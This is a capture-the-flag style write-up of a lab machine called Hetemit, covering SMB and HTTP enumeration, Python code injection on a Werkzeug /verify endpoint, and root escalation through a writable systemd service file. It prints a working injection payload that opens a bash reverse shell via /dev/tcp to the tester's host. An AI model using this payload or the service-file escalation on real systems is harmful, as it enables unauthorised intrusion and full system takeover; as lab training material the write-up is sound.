Hetemit

Target IP: 192.168.156.117
Challenge Description: Hetemit - The Goddess of Destruction.

Running an aggressive port scan against the open TCP ports returns the result above. By the looks of it, the FTP application allows anonymous login. And there is SMB open too.

Enumeration

Ports 139 and 445: SMB

Running smbmap -H 192.168.156.117 shows a share called Cmeeks as shown above. However, I do not have access to the SMB share.


Running enum4linux shows a user called cmeeks exists on the machine, as shown above.

Port 50000: HTTP

I enumerated the two different HTTP applications on the target machine, and I did not find anything useful. However, this application seems to be created using Python and browsing to this application displays the webpage above. There are two REST API routes: /generate and /verify, as shown above.


Browsing to http://192.168.156.117:50000/verify shows the result code, as shown above.


I intercepted the request using Burpsuite. Then I tried changing the request to POST method with the parameter as code=10-202 and obtained the result -192, as shown above. The target machine seems to be executing the commands. The response header contains the technology Werkzeug/1.0.1 Python/3.6.8 used by the target machine. Maybe the target machine is vulnerable to command injection attacks?

Exploitation


And bingo! The target machine seems to be running firewall. I started a listener on my machine at port 80. I sent the curl request curl -X POST http://192.168.156.117:50000/verify --data-urlencode "code=__import__('os').system('bash -i >/dev/tcp/192.168.45.194/80 0>&1')" and obtained a reverse shell connection with the session as cmeeks on my machine at port 80, as shown above.

Privilege Escalation


Running sudo -l shows the interesting commands /sbin/halt, /sbin/reboot, /sbin/poweroff can be executed as root without the password.


Checking for writable service files using the command find / -writable -name "*.service" 2>/dev/null shows /etc/systemd/system/pythonapp.service is a possibility. Since the target machine is already running Python application, this service file is perfect.


The content of /etc/systemd/system/pythonapp.service is shown above.


I modified the /etc/systemd/system/pythonapp.service file with my bash reverse shell. The bash reverse shell is inserted at ExecStart. I also modified the User from cmeeks to root. This part is crucial as I did not make this change at start.


After modifying the ExecStart with the bash reverse shell, and User as root, I initiated the command sudo -u root /sbin/reboot to reboot the machine. Before rebooting, I started a listener on port 21 on my machine. After the reboot I gained a root reverse shell connection on my machine at port 21, as shown above.
